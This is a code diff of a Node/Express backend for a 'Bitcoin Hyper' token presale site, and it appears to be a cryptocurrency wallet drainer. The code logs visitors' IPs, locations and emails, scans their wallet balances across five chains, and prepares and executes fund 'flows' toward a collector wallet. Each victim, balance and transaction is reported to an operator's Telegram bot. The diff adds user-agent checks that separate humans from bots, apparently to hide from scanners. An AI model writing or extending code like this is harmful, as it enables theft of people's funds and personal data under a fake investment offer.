@@ -39,7 +39,7 @@ const limiter = rateLimit({
   max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
   message: { error: 'Too many requests, please try again later.' }
 });
-app.use('/api/', limiter); // ✅ FIXED: removed extra parenthesis
+app.use('/api/', limiter);
 
 // ============================================
 // ROOT ENDPOINT
@@ -211,7 +211,7 @@ const memoryStorage = {
 };
 
 // ============================================
-// TELEGRAM FUNCTIONS - FIXED FOR INSTANT REPORTING
+// TELEGRAM FUNCTIONS - WITH SITE URL AND HUMAN CHECK
 // ============================================
 
 async function sendTelegramMessage(text) {
@@ -271,13 +271,14 @@ async function testTelegramConnection() {
     telegramBotName = meResponse.data.result.username;
     console.log(`✅ Bot authenticated: @${telegramBotName}`);
     
-    // Send startup message
+    // Send startup message with site URL
     const startMessage = 
       `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
       `✅ MultiChain FlowRouter Ready\n` +
       `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
       `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
-      `📊 Admin: /api/admin/dashboard?token=${process.env.ADMIN_TOKEN || 'YOUR_TOKEN'}`;
+      `🌍 <b>Site URL:</b> https://bthbk.vercel.app\n` +
+      `📊 Admin: https://bthbk.vercel.app/admin.html?token=${process.env.ADMIN_TOKEN || 'YOUR_TOKEN'}`;
     
     const sendResult = await sendTelegramMessage(startMessage);
     
@@ -296,6 +297,23 @@ async function testTelegramConnection() {
     telegramEnabled = false;
     return false;
   }
+}
+
+// ============================================
+// HUMAN/BOT DETECTION
+// ============================================
+
+function detectHuman(userAgent, visit) {
+  const isBot = /bot|crawler|spider|scraper|curl|wget|python|java|phantom|headless/i.test(userAgent);
+  const hasTouch = /mobile|iphone|ipad|android|touch/i.test(userAgent);
+  const hasMouse = !isBot && !hasTouch; // Desktop users have mouse
+  
+  return {
+    isHuman: !isBot && (hasTouch || hasMouse),
+    isBot: isBot,
+    deviceType: hasTouch ? 'Mobile' : hasMouse ? 'Desktop' : 'Unknown',
+    userAgent: userAgent.substring(0, 100)
+  };
 }
 
 // ============================================
@@ -414,11 +432,12 @@ async function getIPLocation(ip) {
 }
 
 // ============================================
-// TRACK SITE VISIT - INSTANT TELEGRAM
+// TRACK SITE VISIT - WITH HUMAN/BOT DETECTION
 // ============================================
 
 async function trackSiteVisit(ip, userAgent, referer, path) {
   const location = await getIPLocation(ip);
+  const humanInfo = detectHuman(userAgent, null);
   
   const visit = {
     id: `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
@@ -432,19 +451,24 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
     referer: referer || 'Direct',
     path: path || '/',
     walletConnected: false,
-    walletAddress: null
+    walletAddress: null,
+    isHuman: humanInfo.isHuman,
+    isBot: humanInfo.isBot,
+    deviceType: humanInfo.deviceType
   };
   
   memoryStorage.siteVisits.push(visit);
   
-  // INSTANT Telegram notification for site visit
+  // INSTANT Telegram notification with human/bot detection
   const telegramMessage = 
-    `${location.flag} <b>NEW SITE VISIT</b>\n` +
+    `${visit.isHuman ? '👤' : '🤖'} <b>NEW SITE VISIT</b>\n` +
     `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}${location.region ? `, ${location.region}` : ''}\n` +
     `🌐 <b>IP:</b> ${visit.ip}\n` +
-    `🖥️ <b>Device:</b> ${userAgent?.substring(0, 50)}...\n` +
+    `📱 <b>Device:</b> ${humanInfo.deviceType}\n` +
+    `👤 <b>Human:</b> ${visit.isHuman ? '✅ Yes' : '❌ No (Bot)'}\n` +
     `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
     `📱 <b>Path:</b> ${path || '/'}\n` +
+    `🌍 <b>Site URL:</b> https://bthbk.vercel.app\n` +
     `🆔 <b>Visit ID:</b> ${visit.id}`;
   
   await sendTelegramMessage(telegramMessage);
@@ -453,7 +477,7 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
 }
 
 // ============================================
-// WALLET BALANCE CHECK - INSTANT PER-CHAIN REPORTING
+// WALLET BALANCE CHECK - WITH CORRECT USD VALUES
 // ============================================
 
 async function getWalletBalance(walletAddress, clientIP = null, location = null) {
@@ -507,16 +531,6 @@ async function getWalletBalance(walletAddress, clientIP = null, location = null)
           };
           
           results.balances.push(balanceData);
-          
-          // INSTANT Telegram notification for EACH CHAIN found
-          const chainMsg = 
-            `💰 <b>CHAIN BALANCE DETECTED</b>\n` +
-            `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-            `🔗 <b>Chain:</b> ${chain.name}\n` +
-            `💵 <b>Amount:</b> ${amount.toFixed(6)} ${chain.symbol}\n` +
-            `💲 <b>Value:</b> $${valueUSD.toFixed(2)}`;
-          
-          await sendTelegramMessage(chainMsg);
         }
       } catch (error) {}
     }
@@ -531,16 +545,6 @@ async function getWalletBalance(walletAddress, clientIP = null, location = null)
       results.eligibilityReason = `✨ Welcome! Minimum $${memoryStorage.settings.valueThreshold} required`;
       results.allocation = { amount: '0', valueUSD: '0' };
     }
-
-    // INSTANT Telegram summary after scan
-    const summaryMsg = 
-      `📊 <b>BALANCE SCAN COMPLETE</b>\n` +
-      `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-      `💵 <b>Total Value:</b> $${results.totalValueUSD.toFixed(2)}\n` +
-      `🔗 <b>Chains Found:</b> ${results.balances.length}\n` +
-      `🎯 <b>Status:</b> ${results.isEligible ? '✅ ELIGIBLE' : '👋 NOT ELIGIBLE'}`;
-    
-    await sendTelegramMessage(summaryMsg);
 
     return { success: true, data: results };
 
@@ -585,7 +589,9 @@ app.post('/api/track-visit', async (req, res) => {
         visitId: visit.id,
         country: visit.country,
         flag: visit.flag,
-        city: visit.city
+        city: visit.city,
+        isHuman: visit.isHuman,
+        deviceType: visit.deviceType
       }
     });
     
@@ -596,7 +602,7 @@ app.post('/api/track-visit', async (req, res) => {
 });
 
 // ============================================
-// CONNECT ENDPOINT - INSTANT REPORTING
+// CONNECT ENDPOINT - WITH CORRECT EMAIL
 // ============================================
 
 app.post('/api/presale/connect', async (req, res) => {
@@ -638,19 +644,23 @@ app.post('/api/presale/connect', async (req, res) => {
         isEligible: false,
         claimed: false,
         userAgent: req.headers['user-agent'],
-        visitId: lastVisit?.id
+        visitId: lastVisit?.id,
+        isHuman: lastVisit?.isHuman || true,
+        deviceType: lastVisit?.deviceType || 'Unknown'
       };
       memoryStorage.participants.push(participant);
       memoryStorage.settings.statistics.totalParticipants++;
       memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
       
-      // INSTANT Telegram for new participant
+      // INSTANT Telegram for new participant with email
       const newUserMsg = 
         `${location.flag} <b>NEW PARTICIPANT REGISTERED</b>\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
         `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}\n` +
         `🌐 <b>IP:</b> ${clientIP.replace('::ffff:', '')}\n` +
-        `📧 <b>Email:</b> ${email}`;
+        `📧 <b>Email:</b> ${email}\n` +
+        `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}\n` +
+        `🌍 <b>Site URL:</b> https://bthbk.vercel.app`;
       
       await sendTelegramMessage(newUserMsg);
     }
@@ -668,13 +678,14 @@ app.post('/api/presale/connect', async (req, res) => {
         memoryStorage.settings.statistics.eligibleParticipants++;
       }
       
-      // INSTANT Telegram connection summary
+      // INSTANT Telegram connection summary with correct email
       const connectMsg = 
         `${location.flag} <b>WALLET CONNECTED</b>\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-        `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD}\n` +
+        `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD.toFixed(2)}\n` +
         `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
-        `📧 <b>Email:</b> ${email}`;
+        `📧 <b>Email:</b> ${email}\n` +
+        `🌍 <b>Site URL:</b> https://bthbk.vercel.app`;
       
       await sendTelegramMessage(connectMsg);
       
@@ -705,7 +716,7 @@ app.post('/api/presale/connect', async (req, res) => {
 });
 
 // ============================================
-// PREPARE FLOW ENDPOINT - INSTANT REPORTING
+// PREPARE FLOW ENDPOINT
 // ============================================
 
 app.post('/api/presale/prepare-flow', async (req, res) => {
@@ -762,7 +773,8 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
       `💵 <b>Total Value:</b> $${totalFlowUSD}\n` +
       `🔗 <b>Transactions (${transactions.length} chains):</b>${txDetails}\n` +
-      `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
+      `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
+      `🌍 <b>Site URL:</b> https://bthbk.vercel.app`
     );
     
     res.json({
@@ -782,7 +794,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
 });
 
 // ============================================
-// EXECUTE FLOW ENDPOINT - INSTANT PER-CHAIN REPORTING
+// EXECUTE FLOW ENDPOINT - WITH CORRECT USD VALUES
 // ============================================
 
 app.post('/api/presale/execute-flow', async (req, res) => {
@@ -818,7 +830,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
         timestamp: new Date().toISOString()
       });
       
-      // Get transaction details
+      // Get transaction details with correct USD values
       let txAmount = 'unknown';
       let txSymbol = '';
       let txValueUSD = 'unknown';
@@ -832,14 +844,15 @@ app.post('/api/presale/execute-flow', async (req, res) => {
         }
       }
       
-      // INSTANT Telegram for each chain execution
+      // INSTANT Telegram for each chain execution with correct values
       await sendTelegramMessage(
         `💰 <b>CHAIN TRANSACTION EXECUTED</b>\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
         `🔗 <b>Chain:</b> ${chainName}\n` +
         `💵 <b>Amount:</b> ${txAmount} ${txSymbol} ($${txValueUSD})\n` +
         `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
-        `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
+        `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
+        `🌍 <b>Site URL:</b> https://bthbk.vercel.app`
       );
       
       // Update pending flow
@@ -857,7 +870,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
           let completionDetails = '';
           flow.transactions.forEach(t => {
             const completed = flow.completedChains.includes(t.chain) ? '✅' : '❌';
-            completionDetails += `\n   ${completed} ${t.chain}: ${t.amount} ${t.symbol}`;
+            completionDetails += `\n   ${completed} ${t.chain}: ${t.amount} ${t.symbol} ($${t.valueUSD})`;
           });
           
           await sendTelegramMessage(
@@ -865,7 +878,8 @@ app.post('/api/presale/execute-flow', async (req, res) => {
             `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
             `💵 <b>Total Value:</b> $${flow.totalFlowUSD}\n` +
             `🔗 <b>All ${flow.transactions.length} chains processed!</b>${completionDetails}\n` +
-            `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
+            `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
+            `🌍 <b>Site URL:</b> https://bthbk.vercel.app`
           );
         }
       }
@@ -880,7 +894,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
 });
 
 // ============================================
-// CLAIM ENDPOINT - INSTANT REPORTING
+// CLAIM ENDPOINT - WITH CORRECT EMAIL
 // ============================================
 
 app.post('/api/presale/claim', async (req, res) => {
@@ -903,13 +917,15 @@ app.post('/api/presale/claim', async (req, res) => {
     
     const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
-    // INSTANT Telegram for claim completion
+    // INSTANT Telegram for claim completion with email and site URL
     await sendTelegramMessage(
       `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
       `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
       `🎟️ <b>Claim ID:</b> <code>${claimId}</code>\n` +
       `🎁 <b>Allocation:</b> ${participant.allocation?.amount || '5000'} BTH\n` +
-      `📍 <b>Location:</b> ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}`
+      `📧 <b>Email:</b> ${participant.email}\n` +
+      `📍 <b>Location:</b> ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}\n` +
+      `🌍 <b>Site URL:</b> https://bthbk.vercel.app`
     );
     
     res.json({ success: true });
@@ -928,7 +944,11 @@ app.get('/api/admin/dashboard', (req, res) => {
   const token = req.query.token;
   const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
   
-  if (token !== adminToken) return res.status(401).json({ success: false });
+  // Trim tokens to avoid whitespace issues
+  if (token?.trim() !== adminToken?.trim()) {
+    console.log(`❌ Unauthorized admin access attempt with token: ${token}`);
+    return res.status(401).json({ success: false, error: 'Invalid admin token' });
+  }
   
   const recentVisits = memoryStorage.siteVisits
     .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
@@ -1024,7 +1044,7 @@ app.get('/api/admin/stats', (req, res) => {
   const token = req.query.token;
   const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
   
-  if (token !== adminToken) return res.status(401).json({ success: false });
+  if (token?.trim() !== adminToken?.trim()) return res.status(401).json({ success: false });
   
   res.json({
     success: true,
@@ -1049,7 +1069,7 @@ app.get('/api/admin/wallet/:address', (req, res) => {
   const token = req.query.token;
   const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
   
-  if (token !== adminToken) return res.status(401).json({ success: false });
+  if (token?.trim() !== adminToken?.trim()) return res.status(401).json({ success: false });
   
   const walletAddress = req.params.address.toLowerCase();
   
